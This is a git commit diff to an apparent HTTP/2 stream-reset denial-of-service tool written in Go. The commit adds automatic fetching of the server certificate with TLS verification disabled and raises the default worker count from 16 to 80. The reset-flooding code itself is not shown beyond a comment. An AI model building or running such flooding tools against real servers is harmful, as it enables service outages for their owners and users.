d31bed372834fc9eb801cb97780e2e7ad3ab68bd
mseewer <4114029-mseewer@users.noreply.gitlab.com>
2024-08-14 14:49:53 +0200

    add automatic fetching of server cert

--- workspace/http2-rst-stream/main.go
+++ workspace/http2-rst-stream/main.go
@@ -2,20 +2,66 @@ package main
 
 import (
 	"bytes"
+	"crypto/tls"
+	"encoding/pem"
 	"flag"
 	"fmt"
 	"io"
 	"log"
 	"net/http"
 	"net/url"
+	"os"
 	"time"
 )
 
 var (
 	listenPort = flag.Int("listen_port", 443, "Server listening port")
 	certFile   = flag.String("cert_file", "server.crt", "TLS server cert")
-	numWorkers = flag.Int("num_workers", 16, "number of async workers")
+	numWorkers = flag.Int("num_workers", 80, "number of async workers")
 )
+
+func fetchAndSaveServerCert(serverURL string, certFile string) error {
+	conn, err := tls.Dial("tcp", serverURL, &tls.Config{
+		InsecureSkipVerify: true,
+	})
+	if err != nil {
+		return fmt.Errorf("failed to connect: %v", err)
+	}
+	defer conn.Close()
+
+	certs := conn.ConnectionState().PeerCertificates
+	if len(certs) == 0 {
+		return fmt.Errorf("no certificates found")
+	}
+
+	// Open or create the certificate file
+	file, err := os.Create(certFile)
+	if err != nil {
+		return fmt.Errorf("failed to create file: %v", err)
+	}
+	defer file.Close()
+
+	// Iterate over all certificates and write them to the file
+	for idx, cert := range certs {
+		// URL-decode the raw certificate bytes
+		// decodedCert, err := url.QueryUnescape(string(cert.Raw))
+		// if err != nil {
+		// 	return fmt.Errorf("failed to URL decode certificate %d: %v", idx, err)
+		// }
+
+		pemBlock := &pem.Block{
+			Type:  "CERTIFICATE",
+			Bytes: cert.Raw,
+		}
+
+		if err := pem.Encode(file, pemBlock); err != nil {
+			return fmt.Errorf("failed to write certificate %d to file: %v", idx, err)
+		}
+	}
+
+	fmt.Println("Certificate written to", certFile, "successfully")
+	return nil
+}
 
 func asyncWorker(workerId int, serverUrl *url.URL) {
 	// Abuse the checks on body size to send Stream RSTs
@@ -38,6 +84,11 @@ func main() {
 	if err != nil {
 		log.Fatalf("failed to parse internal URL: %s", err)
 	}
+	err = fetchAndSaveServerCert(serverUrl.Host, *certFile)
+	if err != nil {
+		log.Fatalf("failed to fetch server certificate: %s", err)
+	}
+	fmt.Println("Server URL:", serverUrl)
 
 	for i := 0; i < *numWorkers; i++ {
 		go asyncWorker(i, serverUrl)
